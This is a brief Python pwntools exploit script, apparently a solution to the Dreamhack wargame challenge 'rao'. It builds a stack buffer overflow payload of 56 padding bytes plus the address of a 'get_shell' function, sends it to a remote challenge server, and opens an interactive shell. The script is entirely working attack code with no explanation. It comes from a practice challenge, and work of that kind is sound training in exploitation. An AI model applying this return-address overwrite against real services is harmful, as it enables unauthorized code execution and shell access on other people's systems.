from pwn import *

exe = ELF("./rao")
# r = process(exe.path)
r = remote("host3.dreamhack.games", 15236)

payload = b"a" * 56 + p64(exe.sym['get_shell'])

r.sendlineafter(b"Input: ", payload)
r.interactive()